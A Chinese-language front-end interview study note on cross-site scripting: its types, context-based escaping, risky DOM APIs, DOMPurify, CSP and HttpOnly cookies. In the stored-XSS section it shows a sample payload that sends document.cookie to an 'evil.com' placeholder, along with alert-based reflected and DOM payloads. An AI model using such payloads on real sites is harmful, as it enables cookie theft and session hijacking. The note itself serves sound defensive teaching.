# XSS 的理解

## 面试定位

XSS 是前端安全最高频题之一。面试重点不是只说“过滤输入”，而是要讲清攻击原理、三种类型、输出上下文转义、CSP、HttpOnly，以及在富文本场景怎么处理。

## 核心原理

XSS（Cross-Site Scripting，跨站脚本攻击）指攻击者把恶意脚本注入到页面中，让脚本在其他用户浏览器里执行。

本质原因是：应用把不可信数据当成可信代码或 HTML 输出到了页面。

攻击者一旦能执行脚本，可能做这些事：

- 窃取 Cookie、Token、用户信息。
- 伪造用户操作。
- 修改页面内容，诱导用户输入敏感信息。
- 发起请求攻击业务接口。
- 劫持前端路由或埋点数据。

## XSS 类型

### 存储型 XSS

恶意内容被保存到服务端，比如评论、昵称、文章、富文本。其他用户访问页面时，服务端把恶意内容返回，浏览器执行脚本。

```html
<script>fetch("https://evil.com?cookie=" + document.cookie)</script>
```

危害较大，因为它会影响所有看到这条内容的用户。

### 反射型 XSS

恶意脚本出现在 URL 参数里，服务端把参数直接拼进页面返回。

```text
https://example.com/search?q=<script>alert(1)</script>
```

通常需要诱导用户点击恶意链接。

### DOM 型 XSS

漏洞发生在前端代码中。前端读取 URL、localStorage、postMessage 等不可信输入，并直接写入 DOM。

```javascript
const keyword = location.hash.slice(1);
document.body.innerHTML = keyword;
```

如果 URL 是：

```text
https://example.com/#<img src=x onerror=alert(1)>
```

就可能执行恶意代码。

## 防御原则

XSS 防御的核心不是“简单过滤”，而是：

1. 不信任任何用户输入。
2. 根据输出上下文做正确转义。
3. 避免把不可信内容作为 HTML 执行。
4. 对富文本做白名单净化。
5. 用 CSP、HttpOnly 等机制降低攻击成功后的影响。

## 输出转义

不同输出位置需要不同处理。

### HTML 文本上下文

把 `<`、`>`、`&`、`"`、`'` 等字符转义。

```html
<div>{{ escapedUserInput }}</div>
```

现代框架如 Vue、React 默认会对文本插值做转义。

### HTML 属性上下文

属性里也要转义，并避免拼接事件属性。

```html
<!-- 不推荐 -->
<div onclick="handle('{{ input }}')"></div>
```

### URL 上下文

URL 参数要使用 `encodeURIComponent`，并限制协议。

```javascript
const url = `/search?q=${encodeURIComponent(keyword)}`;
```

尤其要警惕：

```text
javascript:alert(1)
```

### JavaScript 上下文

不要把用户输入直接拼进脚本字符串。

```html
<script>
    const name = "{{ userInput }}"; // 风险高，容易逃逸
</script>
```

更好的方式是通过 JSON 安全序列化，或通过接口获取数据。

## 避免危险 API

高风险 API：

- `innerHTML`
- `outerHTML`
- `document.write`
- `eval`
- `new Function`
- 字符串形式的 `setTimeout`

如果必须渲染 HTML，需要使用白名单净化库，例如 DOMPurify。

```javascript
import DOMPurify from "dompurify";

container.innerHTML = DOMPurify.sanitize(html);
```

## CSP

CSP（Content Security Policy）可以限制页面允许加载和执行的资源。

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

CSP 的作用是兜底：即使页面里出现注入点，也尽量阻止内联脚本或外部恶意脚本执行。

但 CSP 不能替代输入输出处理。

## HttpOnly 和 SameSite

`HttpOnly` 可以禁止 JavaScript 读取 Cookie。

```http
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax
```

这样即使 XSS 发生，攻击者也不能直接通过 `document.cookie` 读取会话 Cookie。

但注意：XSS 仍然可以在用户浏览器里发请求，所以 HttpOnly 只能降低 Cookie 泄露风险，不能彻底消除 XSS 危害。

## 面试回答

可以这样答：

> XSS 是攻击者把恶意脚本注入页面，让脚本在用户浏览器执行。本质是应用把不可信输入当成 HTML 或脚本输出。常见类型有存储型、反射型和 DOM 型。防御上不能只说过滤输入，更重要的是按输出上下文做转义：HTML 文本、属性、URL、JS 字符串的处理方式不同。前端要避免直接使用 `innerHTML`、`eval` 这类危险 API，富文本场景用白名单净化，比如 DOMPurify。服务端和前端还可以配合 CSP 限制脚本来源，用 HttpOnly Cookie 降低 Cookie 被盗风险。现代框架默认文本插值会转义，但使用 `v-html`、`dangerouslySetInnerHTML` 时仍然要非常谨慎。

## 高频追问

### React / Vue 默认能防 XSS 吗？

默认文本插值能转义 HTML，能防一部分 XSS。但如果使用 Vue 的 `v-html`、React 的 `dangerouslySetInnerHTML`，或者手动操作 `innerHTML`，仍然可能产生 XSS。

### 只做输入过滤够吗？

不够。输入过滤容易漏场景，也可能误伤合法内容。更可靠的是在输出时根据上下文转义，富文本用白名单净化。

### CSP 能彻底防住 XSS 吗？

不能。CSP 是重要兜底，可以阻止很多内联脚本和非可信来源脚本，但配置不当会失效，也不能替代正确的转义和净化。

### XSS 和 CSRF 有什么关系？

XSS 是在用户浏览器执行恶意脚本，CSRF 是诱导浏览器带着用户凭证发请求。XSS 一旦成功，通常可以绕过很多 CSRF 防护，因为脚本运行在目标站点上下文里。

## 相关链接

- [CSRF 的理解](/md/安全/CSRF的理解.md)
- [HTTPS](/md/网络/HTTPS.md)
- [网络与安全](/md/面试准备/技术/网络与安全.md)
